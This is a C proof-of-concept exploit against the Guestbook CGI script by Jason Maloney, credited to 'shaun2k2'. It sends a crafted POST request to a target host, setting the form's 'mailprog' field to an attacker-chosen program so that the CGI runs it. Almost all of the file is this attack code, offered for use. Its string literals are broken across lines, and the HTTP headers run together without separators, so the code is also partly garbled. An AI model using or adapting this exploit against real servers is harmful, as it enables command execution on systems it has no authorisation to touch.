/* Jason Maloney's Guestbook CGI vulnerability PoF.
 *
 * Discovered and written by shaun2k2 -
shaunige@yahoo.co.uk.
 *
 * A few things in the HTTP headers WILL need to be
changed appropriately to custom values for this
exploit to WORK.
 *
 * Greets to: rider, maveric, sw0rdf1sh, liquidfish,
pc_the_great, peter, rizzo, theclone, msViolet,
Kankraka, deadprez, hades, the p0pe, port9, Dr
Frankenstein, and whitedwarf.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 80

int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Jason Maloney's CGI Guestbook
Exploit.\n");
                printf("Discovered and written by
shaun2k2 - shaunige@yahoo.co.uk\n");
                printf("\nUsage: %s <host>\n",
argv[0]);
                exit(-1);
        }

        int sock;

        printf("- Preparing exploit buffer.\n");
        char http_request[] = "POST
/guestbook/guest.cgi HTTP/1.1"
                              "Host: localhost"
                              "User-Agent: Mozilla/5.0
(Windows; U; Win98; en-US; rv:1.2) Gecko/20021205"
                              "Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1"
                              "Accept-Language:
en-us,en;q=0.5"
                              "Accept-Encoding:
gzip,deflate"
                              "Accept-Charset:
ISO-8859-1,utf-8;q=0.7,*;q=0.7"
                              "Keep-Alive: 300"
                              "Connection: keep-alive"
                              "Referer:
http://localhost/guestbook/add.html"
                              "Content-Type:
application/x-www-form-urlencoded"
                              "Content-Length: 111"

"name=dgf&email=shaunige@yahoo.co.uk&url=http%3A%2F%2Fdfg&city=dfg&state=dfg&country=USA&comments=dfg&mailprog=evilprog&x=15&y=20";
        struct sockaddr_in dest;
        struct hostent *he;

        if((he = gethostbyname(argv[1])) == NULL) {
                printf("Couldn't resolve
hostname!\n");
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_STREAM, 0)) ==
-1) {
                perror("socket()");
                exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_addr = *((struct in_addr
*)he->h_addr);
        dest.sin_port = htons(PORT);

        printf("[!] Connecting.\n");
        if(connect(sock, (struct sockaddr *)&dest,
sizeof(struct sockaddr)) == -1) {
                perror("connect()");
                exit(-1);
        }

        printf("[+] Connected!\n");
        printf("[*] Sending exploit buffer.\n");
        send(sock, http_request, strlen(http_request),
0);
        sleep(1);
        printf("[*] Exploit buffer sent!\n");
        sleep(1);
        close(sock);
        printf("[!] Disconnected.\n");

        return(0);
}

